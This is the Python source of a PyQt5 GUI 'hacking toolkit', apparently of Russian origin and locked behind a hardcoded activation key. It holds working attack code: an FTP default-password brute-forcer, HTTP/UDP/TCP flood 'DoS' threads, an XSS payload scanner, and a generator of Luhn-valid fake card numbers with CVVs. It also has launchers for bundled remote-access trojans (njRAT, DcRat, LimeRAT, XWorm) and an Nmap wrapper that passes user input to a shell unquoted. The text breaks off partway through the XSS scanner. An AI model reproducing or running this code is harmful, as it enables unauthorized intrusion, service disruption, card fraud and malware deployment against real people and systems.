#BY @thiasoft
#Coded by RENC(@Xahrvs)


import sys
import random
import math
import smtplib
import sys
import requests
import ftplib
import os
import socket
import time
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import random
import subprocess
from bs4 import BeautifulSoup
import threading
import sqlite3
import pandas as pd
from PyQt5.QtWidgets import QFileDialog
from email.mime.text import MIMEText
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtWidgets import (
    QDoubleSpinBox,
    QSpinBox,
    QComboBox,
    QGridLayout,
    QHBoxLayout,
    QFormLayout,
)
from PyQt5.QtGui import QIcon, QPixmap
from urllib.parse import quote, urljoin, urlencode
from email.mime.multipart import MIMEMultipart
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QDialog, QLineEdit, QPushButton, QLabel, QMessageBox, QAction, QTextEdit
from PyQt5.QtGui import QPainter, QColor, QIcon
from PyQt5.QtCore import Qt, QTimer, QPointF
from PyQt5.QtGui import QDesktopServices, QFont
from PyQt5.QtCore import QUrl
from playsound import playsound


def play_start_music():
    try:
        playsound.playsound('music/startpl.mp3')
    except Exception as e:
        print(f"Error playing music: {str(e)}")

threading.Thread(target=play_start_music).start()

def generate_personality():
    first_names = [
        "John", "Jane", "Alice", "Robert", "Michael", "Emily", "David", "Laura",
        "James", "Mary", "William", "Linda", "Richard", "Barbara", "Joseph", "Elizabeth",
        "Charles", "Jennifer", "Thomas", "Patricia"
    ]
    
    last_names = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
        "Thomas", "Taylor", "Moore", "Jackson", "Martin"
    ]
    
    street_names = [
        "Main St", "High St", "Park Ave", "2nd St", "3rd St", "Oak St", "Pine St",
        "Maple St", "Cedar St", "Elm St", "Walnut St", "Willow St", "Church St",
        "Washington Ave", "Lake St", "Hill St"
    ]
    
    city_names = [
        "New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia",
        "San Antonio", "San Diego", "Dallas", "San Jose", "Austin", "Jacksonville",
        "Fort Worth", "Columbus", "Charlotte", "San Francisco"
    ]
    
    state_abbrs = [
        "NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH", "NC", "GA", "MI", "NJ",
        "VA", "WA", "MA", "IN", "TN", "MO", "MD", "WI"
    ]
    
    house_numbers = range(100, 1000)
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    house_number = random.choice(house_numbers)
    street_name = random.choice(street_names)
    city_name = random.choice(city_names)
    state_abbr = random.choice(state_abbrs)
    zip_code = random.randint(10000, 99999)
    
    name = f"{first_name} {last_name}"
    address = f"{house_number} {street_name}, {city_name}, {state_abbr} {zip_code}"
    age = random.randint(18, 90)
    
    personality = {
        "name": name,
        "age": age,
        "address": address
    }
    
    return personality


#генератор фейковых карт
def generate_luhn_digit(number):
    """Вычисляет контрольную цифру по алгоритму Луна"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = 0
    checksum += sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return (10 - (checksum % 10)) % 10

def generate_fake_card():
    card_types = {
        "Visa": "4",
        "MasterCard": "5",
        "American Express": "3",
        "Мир": "2",
        "Maestro": ["3", "5", "6"],
        "China Union Pay": "6",
        "JCB International": "3",
        "Universal electronic card": "7"
    }
    
    card_type = random.choice(list(card_types.keys()))
    prefix = card_types[card_type]
    if isinstance(prefix, list):
        prefix = random.choice(prefix)
    
    bin_number = prefix + "".join([str(random.randint(0, 9)) for _ in range(5)])
    
    account_number = "".join([str(random.randint(0, 9)) for _ in range(9)])
    
    partial_card_number = bin_number + account_number

    check_digit = generate_luhn_digit(partial_card_number)

    card_number = partial_card_number + str(check_digit)
    
    expiry_date = f"{random.randint(1, 12):02}/{random.randint(22, 30)}"
    cvv = random.randint(100, 999)
    
    card = {
        "type": card_type,
        "number": card_number,
        "expiry_date": expiry_date,
        "cvv": cvv
    }
    
    return card


class WebAnimation(QWidget):
    def __init__(self):
        super().__init__()
        self.setMouseTracking(True)
        self.points = []
        self.velocities = []
        self.initPoints()
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.updateAnimation)
        self.timer.start(50)
        self.cursor_pos = QPointF(self.width() // 2, self.height() // 2)

    def initPoints(self):
        num_points = 50
        self.points = [QPointF(random.randint(0, self.width()), random.randint(0, self.height())) for _ in range(num_points)]
        self.velocities = [QPointF(random.uniform(-2, 2), random.uniform(-2, 2)) for _ in range(num_points)]

    def updateAnimation(self):
        for i in range(len(self.points)):
            self.points[i] += self.velocities[i]
            if self.points[i].x() < 0 or self.points[i].x() > self.width():
                self.velocities[i].setX(-self.velocities[i].x())
            if self.points[i].y() < 0 or self.points[i].y() > self.height():
                self.velocities[i].setY(-self.velocities[i].y())
        self.update()

    def mouseMoveEvent(self, event):
        self.cursor_pos = QPointF(event.pos())
        self.update()
        super().mouseMoveEvent(event)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.fillRect(self.rect(), QColor(0, 0, 0))
        painter.setPen(QColor(255, 255, 255, 50))
        for point in self.points:
            distance = math.sqrt((self.cursor_pos.x() - point.x()) ** 2 + (self.cursor_pos.y() - point.y()) ** 2)
            if distance < 150:
                painter.drawLine(self.cursor_pos, point)
                for other_point in self.points:
                    if other_point != point:
                        distance_between_points = math.sqrt((point.x() - other_point.x()) ** 2 + (point.y() - other_point.y()) ** 2)
                        if distance_between_points < 150:
                            painter.drawLine(point, other_point)
        for point in self.points:
            painter.setBrush(QColor(255, 255, 255))
            painter.drawEllipse(point, 3, 3)

    def resizeEvent(self, event):
        self.initPoints()
        super().resizeEvent(event)

class AuthenticationDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Authentication")
        self.setWindowIcon(QIcon('imgs/key.png'))
        self.setFixedSize(320, 200)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)

        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)
        self.setLayout(main_layout)

        form_layout = QFormLayout()
        form_layout.setSpacing(10)
        main_layout.addLayout(form_layout)

        font = QFont("Arial", 11)

        self.username_entry = self.create_labeled_entry(form_layout, "Enter username:", font)

        self.key_entry = self.create_labeled_entry(form_layout, "Enter activation key:", font, QLineEdit.Password)

        button_layout = QHBoxLayout()
        button_layout.setSpacing(10)
        main_layout.addLayout(button_layout)

        self.submit_button = self.create_button("Submit", font, "#4CAF50", self.check_activation)
        button_layout.addWidget(self.submit_button)

        self.setStyleSheet("background-color: #2c2c2c;")

    def create_labeled_entry(self, layout, label_text, font, echo_mode=None):
        label = QLabel(label_text)
        label.setFont(font)
        label.setAlignment(Qt.AlignRight)
        label.setStyleSheet("color: #ffffff;")

        entry = QLineEdit()
        entry.setFont(font)
        if echo_mode:
            entry.setEchoMode(echo_mode)
        entry.setStyleSheet("""
            border-radius: 10px;
            border: 1px solid #555555;
            padding: 5px;
            background-color: #333333;
            color: #ffffff;
        """)

        layout.addRow(label, entry)
        return entry

    def create_button(self, text, font, background_color, callback):
        button = QPushButton(text)
        button.setFont(font)
        button.setStyleSheet(f"""
            border-radius: 10px;
            padding: 5px 10px;
            background-color: {background_color};
            color: white;
        """)
        button.clicked.connect(callback)
        return button

    def check_activation(self):
        if self.username_entry.text() and self.key_entry.text() == "@thiasoft":
            self.accept()
        else:
            QMessageBox.warning(self, "Invalid Credentials", "Invalid activation key. Please try again.")
        
        self.username_entry.clear()
        self.key_entry.clear()

        
        
class FTPChecker(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("FTP BruteForce")
        self.setWindowIcon(QIcon('imgs/ftpcheck.png'))
        self.setFixedSize(600, 400)
        layout = QVBoxLayout()

        self.server_label = QLabel("FTP Servers (one per line):")
        layout.addWidget(self.server_label)

        self.servers_entry = QTextEdit()
        self.servers_entry.setPlaceholderText("ftp.example.com:21\nftp.test.com:2121\nftp.another.com")
        layout.addWidget(self.servers_entry)

        self.check_button = QPushButton("Check FTP Default Passwords")
        self.check_button.clicked.connect(self.start_checking)
        layout.addWidget(self.check_button)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_checking(self):
        servers_text = self.servers_entry.toPlainText()
        servers = [line.strip() for line in servers_text.split('\n') if line.strip()]

        self.result_text.clear()

        self.check_button.setEnabled(False)

        self.worker = FTPCheckerWorker(servers)
        self.worker.log.connect(self.handle_log)
        self.worker.check_finished.connect(self.handle_check_finished)
        self.worker.start()

    def handle_log(self, log_entry):
        self.result_text.append(log_entry)

    def handle_check_finished(self):
        self.check_button.setEnabled(True)
        self.result_text.append("All FTP servers checked for default passwords.")

#фтп брутфорсер(тупо чекает базовые пароли)
class FTPCheckerWorker(QThread):
    log = pyqtSignal(str)
    check_finished = pyqtSignal()

    def __init__(self, servers):
        super().__init__()
        self.servers = servers

    def run(self):
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
            response = requests.get(url, stream=True)
            response.raise_for_status()

            passwords = response.iter_lines(decode_unicode=True)

            for server_info in self.servers:
                try:
                    server, port = server_info.split(':')
                    port = int(port)
                except ValueError:
                    server = server_info.strip()
                    port = 21  #дефолтный фтп порт

                ftp = ftplib.FTP()

                for line in passwords:
                    if line.strip(): 
                        try:
                            username, password = line.strip().split(':', 1)

                            ftp.connect(server, port)
                            ftp.login(username, password)

                            log_entry = f"Successful login to {server}:{port} - {username}:{password}"
                            self.log.emit(log_entry)

                            ftp.quit()

                        except Exception as e:
                            log_entry = f"Failed to connect to {server}:{port} with {username}:{password}: {str(e)}"
                            self.log.emit(log_entry)
                            continue

                ftp.close()

            self.check_finished.emit()

        except Exception as e:
            print(f"Error: {str(e)}")



class SMTPReporter(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("SMTP Mailer")
        self.setWindowIcon(QIcon('imgs/smtp.png'))
        self.setFixedSize(400, 300)
        layout = QVBoxLayout()
        self.server_entry = QLineEdit()
        self.server_entry.setPlaceholderText("SMTP Server")
        layout.addWidget(self.server_entry)
        self.port_entry = QLineEdit()
        self.port_entry.setPlaceholderText("Port")
        layout.addWidget(self.port_entry)
        self.proxy_entry = QLineEdit()
        self.proxy_entry.setPlaceholderText("Proxy (optional)")
        layout.addWidget(self.proxy_entry)
        self.email_entry = QLineEdit()
        self.email_entry.setPlaceholderText("Email")
        layout.addWidget(self.email_entry)
        self.password_entry = QLineEdit()
        self.password_entry.setPlaceholderText("Password")
        self.password_entry.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.password_entry)
        self.recipient_entry = QLineEdit()
        self.recipient_entry.setPlaceholderText("Recipient Email")
        layout.addWidget(self.recipient_entry)
        self.message_entry = QLineEdit()
        self.message_entry.setPlaceholderText("Message")
        layout.addWidget(self.message_entry)
        self.send_button = QPushButton("Send")
        self.send_button.clicked.connect(self.send_email)
        layout.addWidget(self.send_button)
        self.setLayout(layout)

    def send_email(self):
        server = self.server_entry.text()
        port = self.port_entry.text()
        proxy = self.proxy_entry.text()
        email = self.email_entry.text()
        password = self.password_entry.text()
        recipient = self.recipient_entry.text()
        message = self.message_entry.text()
        if not server or not port or not email or not password or not recipient or not message:
            QMessageBox.warning(self, "Error", "Please fill in all required fields")
            return
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = recipient
            msg['Subject'] = "Report"
            msg.attach(MIMEText(message, 'plain'))
            with smtplib.SMTP(server, int(port)) as smtp:
                smtp.starttls()
                smtp.login(email, password)
                smtp.sendmail(email, recipient, msg.as_string())
            QMessageBox.information(self, "Success", "Email sent successfully")
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

class UserAgentGenerator(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("User-Agent Generator")
        self.setFixedSize(400, 300)
        self.setWindowIcon(QIcon('imgs/useragent.png'))  
        layout = QVBoxLayout()

        self.generate_button = QPushButton("Generate User-Agent")
        self.generate_button.clicked.connect(self.generate_user_agent)
        layout.addWidget(self.generate_button)

        self.user_agent_display = QTextEdit()
        self.user_agent_display.setReadOnly(True)
        layout.addWidget(self.user_agent_display)

        self.setLayout(layout)

    def generate_user_agent(self):
        platforms = [
            "Macintosh; Intel Mac OS X 10_15_7",
            "Windows NT 10.0; Win64; x64",
            "X11; Linux x86_64",
            "iPad; CPU OS 14_4 like Mac OS X",
            "Android 10; Mobile",
            "FreeBSD; FreeBSD x86_64"
        ]

        browsers = [
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
            "AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.67 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15"
        ]

        random_platform = random.choice(platforms)
        random_browser = random.choice(browsers)

        user_agent = f"Mozilla/5.0 ({random_platform}) {random_browser}"
        self.user_agent_display.setPlainText(user_agent)
        QMessageBox.information(self, "User-Agent Generated", "User-Agent generated successfully")

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            self.close()

class OSINTDatabaseSearch(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("OSINT Database Search")
        self.setWindowIcon(QIcon('imgs/osintsearch.png'))
        self.setFixedSize(600, 400)
        layout = QVBoxLayout()

        self.import_button = QPushButton("Import Database")
        self.import_button.clicked.connect(self.import_database)
        layout.addWidget(self.import_button)

        self.query_entry = QLineEdit()
        self.query_entry.setPlaceholderText("Enter search query")
        layout.addWidget(self.query_entry)

        self.search_button = QPushButton("Search")
        self.search_button.clicked.connect(self.search_database)
        layout.addWidget(self.search_button)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)
        self.db_connection = None
        self.columns = []

    def import_database(self):
        try:
            file_dialog = QFileDialog()
            file_path, _ = file_dialog.getOpenFileName(self, "Open Database File", "", "Database Files (*.csv *.txt *.db)")
            if file_path:
                if file_path.endswith(".csv"):
                    self.db_connection = sqlite3.connect(":memory:")
                    chunk_size = 10000
                    for chunk in pd.read_csv(file_path, chunksize=chunk_size):
                        chunk.to_sql("data", self.db_connection, if_exists='append', index=False)
                elif file_path.endswith(".txt"):
                    self.db_connection = sqlite3.connect(":memory:")
                    chunk_size = 10000
                    for chunk in pd.read_csv(file_path, delimiter='\t', chunksize=chunk_size):
                        chunk.to_sql("data", self.db_connection, if_exists='append', index=False)
                elif file_path.endswith(".db"):
                    self.db_connection = sqlite3.connect(file_path)
                
                cursor = self.db_connection.cursor()
                cursor.execute("PRAGMA table_info(data)")
                self.columns = [info[1] for info in cursor.fetchall()]
                
                QMessageBox.information(self, "Success", "Database imported successfully")
            else:
                QMessageBox.warning(self, "Error", "No file selected")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to import database: {e}")

    def search_database(self):
        if not self.db_connection:
            QMessageBox.warning(self, "Error", "Please import a database first")
            return
        query = self.query_entry.text()
        if not query:
            QMessageBox.warning(self, "Error", "Please enter a search query")
            return
        try:
            conditions = [f"{col} LIKE ?" for col in self.columns]
            sql_query = f"SELECT * FROM data WHERE {' OR '.join(conditions)}"
            params = [f"%{query}%"] * len(self.columns)
            chunk_size = 1000
            results = []

            for chunk in pd.read_sql_query(sql_query, self.db_connection, params=params, chunksize=chunk_size):
                results.append(chunk)

            df = pd.concat(results)
            self.result_text.setPlainText(df.to_string())
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Search failed: {e}")



class ProxyScraper(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Proxy Scraper")
        self.setWindowIcon(QIcon('imgs/proxy.png'))
        self.setFixedSize(600, 400)
        layout = QVBoxLayout()
        self.scrape_button = QPushButton("Scrape Proxies")
        self.scrape_button.clicked.connect(self.scrape_proxies)
        layout.addWidget(self.scrape_button)
        self.proxy_list = QTextEdit()
        self.proxy_list.setReadOnly(True)
        layout.addWidget(self.proxy_list)
        self.setLayout(layout)

    def scrape_proxies(self):
        urls = [
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
        ]
        proxies = []
        for url in urls:
            try:
                response = requests.get(url)
                response.raise_for_status()
                proxies.extend(response.text.splitlines())
            except requests.RequestException as e:
                QMessageBox.critical(self, "Error", f"Failed to scrape {url}: {e}")
                return
        self.proxy_list.setPlainText("\n".join(proxies))
        QMessageBox.information(self, "Success", "Proxies scraped successfully")

class NmapTool(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Nmap Tool")
        self.setWindowIcon(QIcon('imgs/nmap.png'))
        self.setFixedSize(400, 300)
        layout = QVBoxLayout()
        self.target_entry = QLineEdit()
        self.target_entry.setPlaceholderText("Target IP/Domain")
        layout.addWidget(self.target_entry)
        self.arguments_entry = QLineEdit()
        self.arguments_entry.setPlaceholderText("Arguments (e.g., -sS -p 80)")
        layout.addWidget(self.arguments_entry)
        self.run_button = QPushButton("Run Nmap")
        self.run_button.clicked.connect(self.run_nmap)
        layout.addWidget(self.run_button)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        self.setLayout(layout)

    def run_nmap(self):
        target = self.target_entry.text()
        arguments = self.arguments_entry.text()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP/Domain")
            return
        command = f"nmap {arguments} {target}"
        try:
            result = subprocess.run(command, capture_output=True, text=True, shell=True)
            self.result_text.setPlainText(result.stdout)
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

class IPLogger(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("IP Logger")
        self.setWindowIcon(QIcon('imgs/iplogger.png'))
        self.setFixedSize(400, 200)
        layout = QVBoxLayout()
        self.link_entry = QLineEdit()
        self.link_entry.setPlaceholderText("Enter a URL")
        layout.addWidget(self.link_entry)
        self.generate_button = QPushButton("Generate IP Logger Link")
        self.generate_button.clicked.connect(self.generate_link)
        layout.addWidget(self.generate_button)
        self.logger_link = QLineEdit()
        self.logger_link.setReadOnly(True)
        layout.addWidget(self.logger_link)
        self.setLayout(layout)

class SimpleDialog(QDialog):
    def __init__(self, message):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("About")
        self.setWindowIcon(QIcon('imgs/about.png'))
        self.setFixedSize(300, 150)

        layout = QVBoxLayout()

        self.message_label = QLabel(message)
        layout.addWidget(self.message_label)

        self.ok_button = QPushButton("OK")
        self.ok_button.clicked.connect(self.accept)
        layout.addWidget(self.ok_button)

        self.setLayout(layout)

class IPInfo(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("IP Info")
        self.setWindowIcon(QIcon('imgs/ipinfo.png'))
        self.setFixedSize(400, 300)
        layout = QVBoxLayout()
        self.ip_entry = QLineEdit()
        self.ip_entry.setPlaceholderText("Enter an IP address")
        layout.addWidget(self.ip_entry)
        self.lookup_button = QPushButton("Lookup IP Info")
        self.lookup_button.clicked.connect(self.lookup_ip)
        layout.addWidget(self.lookup_button)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        self.setLayout(layout)

    def lookup_ip(self):
        ip = self.ip_entry.text()
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address")
            return
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            response.raise_for_status()
            data = response.json()
            info = "\n".join(f"{key}: {value}" for key, value in data.items())
            self.result_text.setPlainText(info)
        except requests.RequestException as e:
            QMessageBox.critical(self, "Error", f"Failed to get IP info: {e}")

class KadickRunner:
    def __init__(self):
        self.exe_path = os.path.abspath('apps/kadick/kadick.exe')

    def launch_exe(self):
        try:
            if not os.path.exists(self.exe_path):
                raise FileNotFoundError(f"File not found: {self.exe_path}")

            if os.name == 'nt':  #шиндовс
                subprocess.Popen(['cmd', '/c', 'start', 'cmd', '/k', self.exe_path], shell=True)
            elif os.name == 'posix':  #линух и макос
                subprocess.Popen(['x-terminal-emulator', '-e', self.exe_path])
            else:
                raise OSError(f"Unsupported OS: {os.name}")

            print(f"Executable '{self.exe_path}' successfully launched.")
        except FileNotFoundError as e:
            print(f"Error: {e}")
        except Exception as e:
            print(f"Error launching executable: {e}")

    def run(self):
        self.launch_exe()

class NjratMain:
    def __init__(self):
        self.app_name = "njrat.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")

#изначально тут был TeleShadow, но сейчас DcRat
class TeleShadow:
    def __init__(self):
        self.app_name = "DcRat.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")
            
            
class Eagly:
    def __init__(self):
        self.app_name = "LimeRAT.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps/LimeRat')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")


class Xworm:
    def __init__(self):
        self.app_name = "XWorm.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps/Xworm-V5.6')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")


class DoSAttackThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target, num_requests, attack_type, delay_range=(0.1, 0.5), timeout=5):
        super().__init__()
        self.target = target
        self.num_requests = num_requests
        self.attack_type = attack_type
        self.delay_range = delay_range
        self.timeout = timeout

    def run(self):
        if self.attack_type == "HTTP GET Flood":
            self.http_get_flood()
        elif self.attack_type == "SYN Flood":
            self.syn_flood()
        elif self.attack_type == "UDP Flood":
            self.udp_flood()
        elif self.attack_type == "TCP Flood":
            self.tcp_flood()

    def http_get_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            url = f"http://{target}"
            for _ in range(self.num_requests):
                try:
                    response = requests.get(url, timeout=self.timeout)
                    self.log_signal.emit(f"HTTP GET request sent to {url}, status code: {response.status_code}")
                except requests.RequestException as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def syn_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for _ in range(self.num_requests):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.connect((ip, 80))
                    s.close()
                    self.log_signal.emit(f"SYN packet sent to {ip}")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def udp_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for _ in range(self.num_requests):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(b"A" * 1024, (ip, 80))
                    self.log_signal.emit(f"UDP packet sent to {ip}")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def tcp_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for _ in range(self.num_requests):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, 80))
                    s.send(b"A" * 1024)
                    s.close()
                    self.log_signal.emit(f"TCP packet sent to {ip}")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")


class DoSTool(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("DoS Tool")
        self.setWindowIcon(QIcon('imgs/dos.png'))
        self.setFixedSize(400, 300)
        layout = QVBoxLayout()

        self.target_entry = QLineEdit()
        self.target_entry.setPlaceholderText("Enter target IP/URL")
        layout.addWidget(self.target_entry)

        self.requests_entry = QLineEdit()
        self.requests_entry.setPlaceholderText("Enter number of requests")
        layout.addWidget(self.requests_entry)

        self.delay_min_entry = QDoubleSpinBox()
        self.delay_min_entry.setRange(0.01, 10.0)
        self.delay_min_entry.setSingleStep(0.01)
        self.delay_min_entry.setValue(0.1)
        self.delay_min_entry.setSuffix(" seconds (min)")
        layout.addWidget(self.delay_min_entry)

        self.delay_max_entry = QDoubleSpinBox()
        self.delay_max_entry.setRange(0.01, 10.0)
        self.delay_max_entry.setSingleStep(0.01)
        self.delay_max_entry.setValue(0.5)
        self.delay_max_entry.setSuffix(" seconds (max)")
        layout.addWidget(self.delay_max_entry)

        self.timeout_entry = QSpinBox()
        self.timeout_entry.setRange(1, 60)
        self.timeout_entry.setValue(5)
        self.timeout_entry.setSuffix(" seconds (timeout)")
        layout.addWidget(self.timeout_entry)

        self.attack_type_combo = QComboBox()
        self.attack_type_combo.addItems(["HTTP GET Flood", "SYN Flood", "UDP Flood"])
        layout.addWidget(self.attack_type_combo)

        self.start_button = QPushButton("Start DoS Attack")
        self.start_button.clicked.connect(self.start_dos)
        layout.addWidget(self.start_button)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_dos(self):
        target = self.target_entry.text()
        num_requests = self.requests_entry.text()
        attack_type = self.attack_type_combo.currentText()
        delay_min = self.delay_min_entry.value()
        delay_max = self.delay_max_entry.value()
        timeout = self.timeout_entry.value()

        if not target or not num_requests:
            QMessageBox.warning(self, "Error", "Please enter a target and number of requests")
            return

        try:
            num_requests = int(num_requests)
        except ValueError:
            QMessageBox.warning(self, "Error", "Number of requests must be an integer")
            return

        self.result_text.append(f"Starting {attack_type} on {target} with {num_requests} requests...")

        self.dos_thread = DoSAttackThread(target, num_requests, attack_type, (delay_min, delay_max), timeout)
        self.dos_thread.log_signal.connect(self.update_log)
        self.dos_thread.start()

    def update_log(self, message):
        self.result_text.append(message)


class XSSScannerThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_urls):
        super().__init__()
        self.target_urls = target_urls
        self.payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]

    def run(self):
        for base_url in self.target_urls:
            for payload in self.payloads:
                self.log_signal.emit(f"Scanning {base_url} with payload {payload}")
                try:
                    url = urljoin(base_url, "/")
                    query_params = {'q': payload}
                    encoded_url = url + '?' + urlencode(query_params)
                    
                    response = requests.get(encoded_url)
                    if payload in response.text:
